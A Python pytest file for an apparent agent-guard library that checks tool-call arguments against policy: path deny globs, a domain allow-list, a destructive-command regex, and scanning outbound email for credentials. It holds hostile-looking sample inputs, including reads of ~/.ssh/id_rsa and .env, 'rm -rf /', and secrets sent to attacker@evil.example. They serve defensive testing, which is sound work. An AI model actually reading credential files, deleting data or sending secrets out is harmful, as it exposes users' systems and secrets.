"""Argument checks: paths, hosts and credentials are inspected before a tool runs."""

from __future__ import annotations

from pathlib import Path
from textwrap import dedent

import pytest

from agentshield import Label, PolicyViolationError, Session, Shield, ToolCall, Verdict
from agentshield.engine import EnforcementEngine
from agentshield.exceptions import PolicyError
from agentshield.policy import Policy, load_policy

MANIFEST = {
    "version": 2,
    "unlabelled_tools": "deny",
    "tools": {
        "read_file": {
            "args": {
                "path": {
                    "deny_glob": ["**/.env", "~/.ssh/**"],
                    "sensitive_glob": ["**/secrets/**"],
                }
            }
        },
        "web_fetch": {
            "labels": ["untrusted", "external"],
            "args": {"url": {"allow_domains": ["docs.example.com"]}},
        },
        "send_email": {"labels": ["external"]},
        "shell": {"args": {"command": {"deny_regex": [r"rm\s+-rf\s+/"]}}},
        "store": {},
    },
    "flows": [
        {
            "name": "sensitive-to-external",
            "when": {"session_has": ["confidential"], "tool_has": ["external"]},
            "then": "deny",
        }
    ],
}


def engine(policy: Policy | None = None) -> EnforcementEngine:
    return EnforcementEngine(policy if policy is not None else load_policy(MANIFEST))


def check(name: str, **args: object) -> tuple[Verdict, str, str | None]:
    decision = engine().check(ToolCall(name, args), Session())
    return decision.verdict, decision.reason, decision.rule


# --- paths ------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "~/.ssh/id_rsa",
        "/home/app/.env",
        ".env",
        "../.env",
    ],
)
def test_denied_paths_are_rejected(path: str) -> None:
    verdict, reason, rule = check("read_file", path=path)
    assert verdict is Verdict.DENY
    assert "denied path pattern" in reason
    assert rule == "tools.read_file.args"


@pytest.mark.parametrize("path", ["notes.txt", "docs/readme.md"])
def test_ordinary_paths_are_allowed(path: str) -> None:
    assert check("read_file", path=path)[0] is Verdict.ALLOW


def test_windows_separators_are_normalised() -> None:
    assert check("read_file", path=r"C:\Users\app\.env")[0] is Verdict.DENY


def test_a_missing_argument_is_not_a_violation() -> None:
    assert check("read_file")[0] is Verdict.ALLOW


def test_sensitive_path_taints_the_session_after_the_call() -> None:
    enforcement = engine()
    session = Session()
    call = ToolCall("read_file", {"path": "app/secrets/db_password.txt"})
    assert enforcement.check(call, session).allowed
    assert Label.CONFIDENTIAL not in session.taint
    enforcement.record(call, session=session)
    assert session.taint == {Label.CONFIDENTIAL}


def test_ordinary_read_does_not_taint_the_session() -> None:
    enforcement = engine()
    session = Session()
    enforcement.record(ToolCall("read_file", {"path": "notes.txt"}), session=session)
    assert session.taint == set()


def test_sensitive_path_object_is_understood() -> None:
    enforcement = engine()
    session = Session()
    enforcement.record(ToolCall("read_file", {"path": Path("app/secrets/db.txt")}), session=session)
    assert Label.CONFIDENTIAL in session.taint


# --- URLs -------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "https://docs.example.com/page",
        "https://api.docs.example.com/page",
        "http://docs.example.com:8443/page",
    ],
)
def test_allow_listed_hosts_pass(url: str) -> None:
    assert check("web_fetch", url=url)[0] is Verdict.ALLOW


@pytest.mark.parametrize(
    "url",
    [
        "https://evil.example/page",
        "https://docs.example.com.evil.example/page",
        "https://example.com/page",
        "docs.example.com/page",
        "not a url",
    ],
)
def test_other_hosts_are_rejected(url: str) -> None:
    verdict, reason, rule = check("web_fetch", url=url)
    assert verdict is Verdict.DENY
    assert "not allow-listed" in reason
    assert rule == "tools.web_fetch.args"


# --- regexes ----------------------------------------------------------------------------


def test_deny_regex_blocks_a_dangerous_command() -> None:
    verdict, reason, _ = check("shell", command="rm -rf /")
    assert verdict is Verdict.DENY
    assert "denied pattern" in reason


def test_deny_regex_leaves_other_commands_alone() -> None:
    assert check("shell", command="ls -la")[0] is Verdict.ALLOW


# --- secrets leaving through an external tool -------------------------------------------


def test_aws_key_in_an_outbound_argument_is_denied() -> None:
    key = "AKIAIOSFODNN7EXAMPLE"
    verdict, reason, rule = check("send_email", to="attacker@evil.example", body=key)
    assert verdict is Verdict.DENY
    assert "AWS access key" in reason
    assert key not in reason  # the value must not leak into logs or errors
    assert rule == "tools.send_email.args"


def test_private_key_header_is_denied() -> None:
    verdict, reason, _ = check(
        "send_email", to="x@example.com", body="-----BEGIN RSA PRIVATE KEY-----\nabc"
    )
    assert verdict is Verdict.DENY
    assert "private key" in reason


def test_nested_credential_is_found() -> None:
    token = "ghp_" + "a" * 36
    verdict, reason, _ = check(
        "send_email", to="x@example.com", body={"attachments": [{"text": token}]}
    )
    assert verdict is Verdict.DENY
    assert "GitHub token" in reason


def test_credential_in_bytes_or_an_object_is_found() -> None:
    # Regression: only str, mappings and sequences were scanned, so bytes slipped through.
    class Note:
        def __str__(self) -> str:
            return "key AKIAIOSFODNN7EXAMPLE"

    for body in (b"key AKIAIOSFODNN7EXAMPLE", bytearray(b"AKIAIOSFODNN7EXAMPLE"), Note()):
        verdict, reason, _ = check("send_email", to="x@example.com", body=body)
        assert verdict is Verdict.DENY and "AWS access key" in reason


def test_benign_outbound_argument_passes() -> None:
    assert check("send_email", to="john@example.com", body="The Q3 report is attached.")[0] is (
        Verdict.ALLOW
    )


def test_secrets_are_not_scanned_for_tools_that_are_not_external() -> None:
    assert check("store", value="AKIAIOSFODNN7EXAMPLE")[0] is Verdict.ALLOW


# --- through the tool wrapper -----------------------------------------------------------


def test_wrapper_denies_before_the_tool_body_runs() -> None:
    shield = Shield.from_policy(MANIFEST)
    calls: list[str] = []

    @shield.tool("read_file")
    def read_file(path: str) -> str:
        calls.append(path)
        return ""

    with shield.session(), pytest.raises(PolicyViolationError, match="denied path"):
        read_file("~/.ssh/id_rsa")
    assert calls == []


def test_wrapper_taint_from_a_sensitive_read_blocks_the_next_external_call() -> None:
    shield = Shield.from_policy(MANIFEST)
    sent: list[str] = []

    @shield.tool("read_file")
    def read_file(path: str) -> str:
        return "secret"

    @shield.tool("send_email")
    def send_email(to: str) -> str:
        sent.append(to)
        return "queued"

    with shield.session() as session:
        read_file("app/secrets/db.txt")
        assert Label.CONFIDENTIAL in session.taint
        with pytest.raises(PolicyViolationError, match="sensitive-to-external"):
            send_email("attacker@evil.example")
    assert sent == []


# --- policy validation ------------------------------------------------------------------


def load(text: str) -> Policy:
    return load_policy(dedent(text))


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        pytest.param(
            "version: 2\ntools:\n  read_file:\n    args:\n      path:\n"
            "        deny_globs: ['**/.env']\n",
            ["tools.read_file.args.path.deny_globs", "Extra inputs"],
            id="typo-in-arg-rule",
        ),
        pytest.param(
            "version: 2\ntools:\n  read_file:\n    args:\n      path:\n        deny_regex: ['[']\n",
            ["deny_regex", "invalid regex"],
            id="invalid-regex",
        ),
        pytest.param(
            "version: 2\ntools:\n  web_fetch:\n    args:\n      url:\n"
            "        allow_domains: ['https://example.com']\n",
            ["allow_domains", "bare hostname"],
            id="scheme-in-domain",
        ),
        pytest.param(
            "version: 2\ntools:\n  web_fetch:\n    args:\n      url:\n"
            "        allow_domains: ['*.example.com']\n",
            ["allow_domains", "bare hostname"],
            id="wildcard-domain",
        ),
        pytest.param(
            "version: 2\ntools:\n  read_file:\n    args:\n      path:\n        deny_glob: ['']\n",
            ["deny_glob", "must not be empty"],
            id="empty-glob",
        ),
    ],
)
def test_bad_argument_rules_are_rejected_with_the_field_named(
    tmp_path: Path, text: str, expected: list[str]
) -> None:
    path = tmp_path / "policy.yaml"
    path.write_text(text, encoding="utf-8")
    with pytest.raises(PolicyError) as info:
        load_policy(path)
    for fragment in expected:
        assert fragment in str(info.value), str(info.value)


def test_argument_rules_are_part_of_the_policy_digest() -> None:
    base = {
        "version": 2,
        "tools": {"read_file": {"args": {"path": {"deny_glob": ["**/.env"]}}}},
    }
    changed = {
        "version": 2,
        "tools": {"read_file": {"args": {"path": {"deny_glob": ["**/.env", "**/.pem"]}}}},
    }
    assert load_policy(base).digest != load_policy(changed).digest
